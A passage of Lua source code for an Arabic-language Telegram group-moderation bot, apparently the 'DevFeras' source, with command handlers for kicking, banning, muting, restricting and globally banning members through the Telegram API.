if text:match("^تفعيل الرفع$") and ChCheck(msg) or text:match("^تفعيل الترقيه$") and ChCheck(msg) then
DevFeras:del(DevFeras.."Feras_dev:lock:set"..msg.chat_id_)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم تفعيل رفع ↫ الادمن • المميز', 1, 'md')
end
if text:match("^تعطيل الرفع$") and ChCheck(msg) or text:match("^تعطيل الترقيه$") and ChCheck(msg) then
DevFeras:set(DevFeras.."Feras_dev:lock:set"..msg.chat_id_,"true")
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم تعطيل رفع ↫ الادمن • المميز', 1, 'md')
end
end
--     Source DevFeras     --
--          Kick          --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text ==('طرد') and ChCheck(msg) then
function KickReply(extra, result, success)
if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevFeras:get("Feras_dev:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
return false
end
if Admin(result.sender_user_id_, result.chat_id_) or tonumber(result.sender_user_id_) == tonumber(DevFeras) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع طرد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم طرده من المجموعه")  
end,nil)
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),KickReply)
end end
if text and text:match('^طرد @(.*)') and ChCheck(msg) then
local username = text:match('^طرد @(.*)')
function KickUser(extra,result,success)
if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevFeras:get("Feras_dev:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
return false
end
if result.id_ then
if Admin(result.id_, msg.chat_id_) or tonumber(result.id_) == tonumber(DevFeras) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع طرد ↫ '..rank_abs(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم طرده من المجموعه")  
end,nil)
end
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,KickUser)
end
if text and text:match('^طرد (%d+)') and ChCheck(msg) then
local user = text:match('طرد (%d+)')
if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevFeras:get("Feras_dev:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
return false
end
if Admin(user, msg.chat_id_) or tonumber(user) == tonumber(DevFeras) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع طرد ↫ '..rank_abs(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
ChatKick(msg.chat_id_, user)
ReplyStatus(msg,user,"reply","⌁︙تم طرده من المجموعه")  
end,nil)
end
end
end 
--     Source DevFeras     --
--          Ban           --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text ==('حظر') and ChCheck(msg) then
function BanReply(extra, result, success)
if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevFeras:get("Feras_dev:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
return false
end
if Admin(result.sender_user_id_, result.chat_id_) or tonumber(result.sender_user_id_) == tonumber(DevFeras) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع حظر ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevFeras:sadd(DevFeras..'abs:Ban:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم حظره من المجموعه") 
end,nil) 
end 
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanReply)
end end
if text and text:match('^حظر @(.*)') and ChCheck(msg) then
local username = text:match('^حظر @(.*)')
function BanUser(extra,result,success)
if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevFeras:get("Feras_dev:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
return false
end
if result.id_ then
if Admin(result.id_, msg.chat_id_) or tonumber(result.id_) == tonumber(DevFeras) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع حظر ↫ '..rank_abs(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
DevFeras:sadd(DevFeras..'abs:Ban:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم حظره من المجموعه")  
end,nil) 
end
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanUser)
end
if text and text:match('^حظر (%d+)') and ChCheck(msg) then
local user = text:match('حظر (%d+)')
if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevFeras:get("Feras_dev:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الطرد او الحظر \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
return false
end
if Admin(user, msg.chat_id_) or tonumber(user) == tonumber(DevFeras) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع حظر ↫ '..rank_abs(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
ChatKick(msg.chat_id_, user)
DevFeras:sadd(DevFeras..'abs:Ban:'..msg.chat_id_, user)
ReplyStatus(msg,user,"reply","⌁︙تم حظره من المجموعه")  
end,nil) 
end
end
--     Source DevFeras     --
--         UnBan          --
local text = msg.content_.text_:gsub('الغاء الحظر','الغاء حظر')
if text ==('الغاء حظر') and ChCheck(msg) then
function UnBanReply(extra, result, success)
DevFeras:srem(DevFeras..'abs:Ban:'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم الغاء حظره من المجموعه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnBanReply)
end end
if text and text:match('^الغاء حظر @(.*)') and ChCheck(msg) then
local username = text:match('^الغاء حظر @(.*)')
function UnBanUser(extra,result,success)
if result.id_ then
DevFeras:srem(DevFeras..'abs:Ban:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.id_,"reply","⌁︙تم الغاء حظره من المجموعه")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnBanUser)
end
if text and text:match('^الغاء حظر (%d+)') and ChCheck(msg) then
local user = text:match('الغاء حظر (%d+)')
DevFeras:srem(DevFeras..'abs:Ban:'..msg.chat_id_, user)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = user, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,user,"reply","⌁︙تم الغاء حظره من المجموعه")  
end 
end 
--     Source DevFeras     --
--          Mute          --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text ==('كتم') and ChCheck(msg) then
function MuteReply(extra, result, success)
if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevFeras:get("Feras_dev:lock:bank"..bot_id..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او التقييد \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
return false
end
if Admin(result.sender_user_id_, result.chat_id_) or tonumber(result.sender_user_id_) == tonumber(DevFeras) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
if DevFeras:sismember(DevFeras..'abs:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙هو بالفعل مكتوم من المجموعه")  
else
DevFeras:sadd(DevFeras..'abs:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم كتمه من المجموعه")  
end 
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteReply)
end end
if text and text:match('^كتم @(.*)') and ChCheck(msg) then
local username = text:match('^كتم @(.*)')
function MuteUser(extra,result,success)
if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevFeras:get("Feras_dev:lock:bank"..bot_id..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او التقييد \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
return false
end
if result.id_ then
if Admin(result.id_, msg.chat_id_) or tonumber(result.id_) == tonumber(DevFeras) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..rank_abs(result.id_, msg.chat_id_), 1, 'md')
else
if DevFeras:sismember(DevFeras..'abs:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"reply","⌁︙هو بالفعل مكتوم من المجموعه")  
else
DevFeras:sadd(DevFeras..'abs:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم كتمه من المجموعه")  
end
end
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteUser)
end
if text and text:match('^كتم (%d+)') and ChCheck(msg) then
local user = text:match('كتم (%d+)')
if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevFeras:get("Feras_dev:lock:bank"..bot_id..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او التقييد \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
return false
end
if Admin(user, msg.chat_id_) or tonumber(user) == tonumber(DevFeras) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..rank_abs(user, msg.chat_id_), 1, 'md')
else
if DevFeras:sismember(DevFeras..'abs:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"reply","⌁︙هو بالفعل مكتوم من المجموعه")  
else
DevFeras:sadd(DevFeras..'abs:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"reply","⌁︙تم كتمه من المجموعه")  
end
end
end
--     Source DevFeras     --
--         UnMute         --
local text = msg.content_.text_:gsub('الغاء الكتم','الغاء كتم')
if text ==('الغاء كتم') and ChCheck(msg) then
function UnMuteReply(extra, result, success)
if not DevFeras:sismember(DevFeras..'abs:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙هو ليس مكتوم لالغاء كتمه")  
else
DevFeras:srem(DevFeras..'abs:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم الغاء كتمه من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnMuteReply)
end end
if text and text:match('^الغاء كتم @(.*)') and ChCheck(msg) then
local username = text:match('^الغاء كتم @(.*)')
function UnMuteUser(extra,result,success)
if result.id_ then
if not DevFeras:sismember(DevFeras..'abs:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"reply","⌁︙هو ليس مكتوم لالغاء كتمه")  
else
DevFeras:srem(DevFeras..'abs:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم الغاء كتمه من المجموعه")  
end
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnMuteUser)
end
if text and text:match('^الغاء كتم (%d+)') and ChCheck(msg) then
local user = text:match('الغاء كتم (%d+)')
if not DevFeras:sismember(DevFeras..'abs:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"reply","⌁︙هو ليس مكتوم لالغاء كتمه")  
else
DevFeras:srem(DevFeras..'abs:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"reply","⌁︙تم الغاء كتمه من المجموعه")  
end
end 
end 
--     Source DevFeras     --
--          Tkeed           --
if Admin(msg.sender_user_id_, msg.chat_id_) then
local text = msg.content_.text_:gsub('تقيد','تقييد')
if text ==('تقييد') and ChCheck(msg) then
function TkeedReply(extra, result, success)
if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevFeras:get("Feras_dev:lock:bank"..bot_id..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او التقييد \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
return false
end
if Admin(result.sender_user_id_, result.chat_id_) or tonumber(result.sender_user_id_) == tonumber(DevFeras) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقييد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
DevFeras:sadd(DevFeras..'abs:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم تقييده من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),TkeedReply)
end end
if text and text:match('^تقييد @(.*)') and ChCheck(msg) then
local username = text:match('^تقييد @(.*)')
function TkeedUser(extra,result,success)
if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevFeras:get("Feras_dev:lock:bank"..bot_id..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او التقييد \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
return false
end
if result.id_ then
if Admin(result.id_, msg.chat_id_) or tonumber(result.id_) == tonumber(DevFeras) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقييد ↫ '..rank_abs(result.id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
DevFeras:sadd(DevFeras..'abs:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم تقييده من المجموعه")  
end
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,TkeedUser)
end
if text and text:match('^تقييد (%d+)') and ChCheck(msg) then
local user = text:match('تقييد (%d+)')
if not MonshId(msg.sender_user_id_, msg.chat_id_) and DevFeras:get("Feras_dev:lock:bank"..bot_id..msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع الكتم او التقييد \n⌁︙لانه معطل من قبل المنشئ ', 1, 'md')
return false
end
if Admin(user, msg.chat_id_) or tonumber(user) == tonumber(DevFeras) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقييد ↫ '..rank_abs(user, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
DevFeras:sadd(DevFeras..'abs:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"reply","⌁︙تم تقييده من المجموعه")  
end
end
--     Source DevFeras     --
--         UnTkeed          --
local text = msg.content_.text_:gsub('الغاء تقيد','الغاء تقييد')
if text ==('الغاء تقييد') and ChCheck(msg) then
function UnTkeedReply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevFeras:srem(DevFeras..'abs:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم الغاء تقييده من المجموعه")  
end
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnTkeedReply)
end end
if text and text:match('^الغاء تقييد @(.*)') and ChCheck(msg) then
local username = text:match('^الغاء تقييد @(.*)')
function UnTkeedUser(extra,result,success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevFeras:srem(DevFeras..'abs:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم الغاء تقييده من المجموعه")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnTkeedUser)
end
if text and text:match('^الغاء تقييد (%d+)') and ChCheck(msg) then
local user = text:match('الغاء تقييد (%d+)')
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevFeras:srem(DevFeras..'abs:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"reply","⌁︙تم الغاء تقييده من المجموعه")  
end
end 
end
--     Source DevFeras     --
--         BanAll         --
if Sudo(msg) then
local text = msg.content_.text_:gsub('حضر عام','حظر عام')
if text ==('حظر عام') then
function BanAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(DevFeras) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevFeras:sadd(DevFeras..'abs:BanAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم حظره عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanAllReply)
end end
if text and text:match('^حظر عام @(.*)') then
local username = text:match('^حظر عام @(.*)')
function BanAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(DevFeras) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevFeras:sadd(DevFeras..'abs:BanAll:', result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم حظره عام من المجموعات")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanAllUser)
end
if text and text:match('^حظر عام (%d+)') then
local user = text:match('حظر عام (%d+)')
if tonumber(user) == tonumber(DevFeras) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(user) == true then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevFeras:sadd(DevFeras..'abs:BanAll:', user)
ReplyStatus(msg,user,"reply","⌁︙تم حظره عام من المجموعات")  
end
--     Source DevFeras     --
--         MuteAll        --
if text ==('كتم عام') then
function MuteAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(DevFeras) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
DevFeras:sadd(DevFeras..'abs:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم كتمه عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteAllReply)
end end
if text and text:match('^كتم عام @(.*)') then
local username = text:match('^كتم عام @(.*)')
function MuteAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(DevFeras) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if result.id_ then
DevFeras:sadd(DevFeras..'abs:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم كتمه عام من المجموعات")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteAllUser)
end
if text and text:match('^كتم عام (%d+)') then
local user = text:match('كتم عام (%d+)')
if tonumber(user) == tonumber(DevFeras) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(user) == true then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
DevFeras:sadd(DevFeras..'abs:MuteAll:', user)
ReplyStatus(msg,user,"reply","⌁︙تم كتمه عام من المجموعات")  
end
--     Source DevFeras     --
--         UnAll          --
local text = msg.content_.text_:gsub('الغاء العام','الغاء عام')
if text ==('الغاء عام') then
function UnAllReply(extra, result, success)
DevFeras:srem(DevFeras..'abs:BanAll:', result.sender_user_id_)
DevFeras:srem(DevFeras..'abs:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","⌁︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnAllReply)
end end
if text and text:match('^الغاء عام @(.*)') then
local username = text:match('^الغاء عام @(.*)')
function UnAllUser(extra,result,success)
if result.id_ then
DevFeras:srem(DevFeras..'abs:BanAll:', result.id_)
DevFeras:srem(DevFeras..'abs:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"reply","⌁︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
else 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnAllUser)
end
if text and text:match('^الغاء عام (%d+)') then
local user = text:match('الغاء عام (%d+)')
DevFeras:srem(DevFeras..'abs:BanAll:', user)
DevFeras:srem(DevFeras..'abs:MuteAll:', user)
ReplyStatus(msg,user,"reply","⌁︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
end
end
end
--     Source DevFeras     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and ChCheck(msg) then
function donky_by_reply(extra, result, success)
local user_info_ = DevFeras:get(DevFeras..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if DevFeras:sismember(DevFeras..'bot:donky:'..msg.chat_id_, result.sender_user_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙هو مطي شرفع منه بعد😹💔', 1, 'md')
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙تم رفعه في قائمة المطايه', 1, 'md')
DevFeras:sadd(DevFeras..'bot:donky:'..msg.chat_id_, result.sender_user_id_)
end end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source DevFeras     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and ChCheck(msg) then
function donky_by_reply(extra, result, success)
local user_info_ = DevFeras:get(DevFeras..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if not DevFeras:sismember(DevFeras..'bot:donky:'..msg.chat_id_, result.sender_user_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ['..absc9..']\n⌁︙هو ليس مطي ليتم تنزيله', 1, 'md')
else
DevFeras:srem(DevFeras..'bot:donky:'..msg.chat_id_, result.sender_user_id_)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙المطي ↫ ['..absc9..']\n⌁︙تم تنزيله من قائمة المطايه', 1, 'md')
end end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source DevFeras     --
if text and text:match('^تقييد دقيقه (%d+)$') and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^تقييد دقيقه (%d+)$")}
local Minutes = string.gsub(mutept[1], 'm', '')
local num1 = tonumber(Minutes) * 60 
local num = tonumber(num1)
local user_info_ = DevFeras:get(DevFeras..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*لا تستطيع تقييدي*', 1, 'md')
return false end 
if Admin(result.sender_user_id_, msg.chat_id_) then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقييد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
MuteTime(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
